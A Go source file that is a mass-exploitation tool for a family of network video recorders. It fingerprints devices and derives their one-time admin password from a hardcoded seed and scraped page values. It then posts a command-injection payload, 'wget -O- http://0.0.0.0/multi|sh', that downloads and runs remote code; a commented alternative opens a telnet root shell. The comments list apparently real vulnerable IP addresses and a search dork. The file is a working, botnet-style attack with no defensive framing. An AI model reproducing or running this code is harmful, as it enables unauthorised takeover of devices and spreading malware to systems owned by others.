package main

import (
	"net"
	"os"
	"time"
	"strconv"
	"net/url"
	"crypto/md5"
	"encoding/base64"
	//"encoding/hex"
	"fmt"
	"io"
	"bytes"
	"strings"
	"runtime"
	"sync"
	"bufio"
)

/*
153.132.36.162 title: main page ||| org: Open Computer Network ||| ports: [8080]
153.142.97.170 title: main page ||| org: Open Computer Network ||| ports: [9080]
153.144.76.118 title: main page ||| org: NTT Plala Inc. ||| ports: [80, 83]
153.156.173.87 title: main page ||| org: Open Computer Network ||| ports: [9080]
153.156.85.234 title: main page ||| org: Open Computer Network ||| ports: [81]

*/

/*
	Dork: html:"/cgi-bin/login.cgi" title:"main page"
*/

var (
	port = os.Args[1]
	maxRoutinesArgs = os.Args[2]

	wg sync.WaitGroup

	timeout = 10 * time.Second

	processed uint64
	found uint64
	exploited uint64

	payload = "wget -O- http://0.0.0.0/multi|sh"
	//payload = "/bin/busybox telnetd -p6969 -l /bin/sh"
)

func findDevice(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.SetDeadline(time.Now().Add(timeout))
	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "main page") && strings.Contains(buff.String(), "cgi-bin/login.cgi")
}

func parseHtml(buff, val string) string {
	buffStr := strings.Split(buff, "<input id=\"" + val + "\" type=\"text\" style=\"width: 200px\" value=\"")

	if len(buffStr) > 1 {
		html := strings.Split(buffStr[1], "\"")

		if len(html) > 0 {
			return html[0]
		}
	}

	return ""
}

func getHtmlVal(target string) string {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	defer conn.Close()

	conn.SetDeadline(time.Now().Add(timeout))
	conn.Write([]byte("GET /cgi-bin/admin_console.cgi HTTP/1.1\r\nHost: " + target + "\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return buff.String()
}

func sendPayload(target, key, pwd string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	//data := "category=system_cmd&key=" + key + "&pwd=" + pwd + "&cmd=" + payload + ""

	params := url.Values{}
	params.Add("category", "system_cmd")
	params.Add("key", key)
	params.Add("pwd", pwd)
	params.Add("cmd", payload)

	data := params.Encode()
	cntLen := strconv.Itoa(len(data))

	conn.SetDeadline(time.Now().Add(timeout))
	conn.Write([]byte("POST /cgi-bin/admin_console_core.cgi HTTP/1.1\r\nHost: " + target + "\r\nContent-Length: "+ cntLen + "\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func loadDevice(target string) {

	html := getHtmlVal(target)


	key := parseHtml(html, "key")
	date := parseHtml(html, "date")

	if key == "" || date == "" {
		return
	}

	data := "$$_NVR ONETIME PWD IS '" + date + "' AND '" + key + "' AND JAKE 700924_$$"

	hash := md5.Sum([]byte(data))

	pwd := base64.StdEncoding.EncodeToString(hash[:8])

	fmt.Printf("[MULTIDVR] %s Key: %s, date: %s, hdr: %s\n", target, key, date, pwd)
	sendPayload(target, key, pwd)
	exploited++
}

func exploitDevice(target string) {

	processed++

	wg.Add(1)
	defer wg.Done()

	if !findDevice(target) {
		return
	}

	found++

	loadDevice(target)
}

func titleWriter() {
	for {
		fmt.Printf("Processed: %d | Found: %d | Exploited: %d | Go Routines: %d\n", 
			processed, found, exploited, runtime.NumGoroutine())
		time.Sleep(1 * time.Second)
	}
}

func main() {

	scanner := bufio.NewScanner(os.Stdin)

	go titleWriter()

	maxRoutines, _ := strconv.Atoi(maxRoutinesArgs)

	for scanner.Scan() {

		for runtime.NumGoroutine() > maxRoutines {
			time.Sleep(1 * time.Second)
		}

		if port == "manual" {
			go exploitDevice(scanner.Text())
		} else {
			go exploitDevice(scanner.Text() + ":" + port)
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}
